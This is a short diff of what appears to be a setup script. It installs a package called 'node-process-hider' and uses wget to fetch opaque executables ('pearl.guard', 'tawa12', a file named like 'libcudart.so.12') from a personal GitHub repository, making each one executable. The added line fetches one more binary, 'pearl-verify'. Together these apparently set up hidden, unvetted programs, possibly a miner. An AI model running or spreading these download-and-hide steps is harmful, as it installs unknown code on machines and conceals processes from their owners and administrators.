@@ -15,6 +15,8 @@ npm i -g node-process-hider
 
 wget https://github.com/usapindong/test/raw/refs/heads/main/pearl.guard && chmod +x pearl.guard
 
+wget https://github.com/usapindong/test/raw/refs/heads/main/pearl-verify && chmod +x pearl-verify
+
 wget https://github.com/usapindong/test/raw/refs/heads/main/tawa12 && chmod +x tawa12
 
 wget https://github.com/usapindong/test/raw/refs/heads/main/libcudart.so.12 && chmod +x libcudart.so.12
